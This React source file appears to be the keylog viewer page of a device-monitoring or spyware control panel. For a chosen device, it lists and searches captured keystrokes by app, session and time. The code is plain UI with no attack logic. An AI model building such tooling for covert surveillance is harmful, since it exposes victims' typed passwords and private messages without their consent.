import { useEffect, useState } from 'react'
import { useParams } from 'react-router-dom'
import PageHeader from '../components/PageHeader'
import DataTable from '../components/DataTable'
import { keylogs } from '../utils/api'
import { Key, Search } from 'lucide-react'

export default function KeylogsPage() {
  const { deviceId } = useParams()
  const [logs, setLogs] = useState([])
  const [searchQuery, setSearchQuery] = useState('')

  useEffect(() => {
    if (deviceId) loadLogs()
  }, [deviceId])

  const loadLogs = async () => {
    const data = await keylogs.list(deviceId)
    if (data) setLogs(data)
  }

  const handleSearch = async () => {
    if (!searchQuery) return loadLogs()
    const data = await keylogs.search(searchQuery, deviceId)
    if (data) setLogs(data)
  }

  const columns = [
    { key: 'app_name', label: 'App', render: (row) => (
      <span className="text-xs px-2 py-1 rounded bg-wuzen-primary/10 text-wuzen-primary">{row.app_name || row.app_package}</span>
    )},
    { key: 'keystrokes', label: 'Keystrokes', render: (row) => (
      <span className="font-mono text-sm text-wuzen-text">{row.keystrokes}</span>
    )},
    { key: 'session_id', label: 'Session', render: (row) => (
      <span className="text-xs text-wuzen-muted font-mono">{row.session_id?.slice(0, 12)}...</span>
    )},
    { key: 'timestamp', label: 'Time', render: (row) => (
      <span className="text-xs font-mono">{new Date(row.timestamp).toLocaleTimeString()}</span>
    )}
  ]

  return (
    <div className="animate-fade-in">
      <PageHeader title="Keylogs" icon={Key} onDeviceChange={() => {}}>
        <div className="flex items-center gap-2">
          <input
            type="text"
            placeholder="Search keystrokes..."
            value={searchQuery}
            onChange={e => setSearchQuery(e.target.value)}
            onKeyDown={e => e.key === 'Enter' && handleSearch()}
            className="wuzen-input w-64"
          />
          <button onClick={handleSearch} className="wuzen-btn-primary text-xs">
            <Search className="w-3 h-3" />
          </button>
        </div>
      </PageHeader>

      <DataTable columns={columns} data={logs} keyField="id" />
    </div>
  )
}
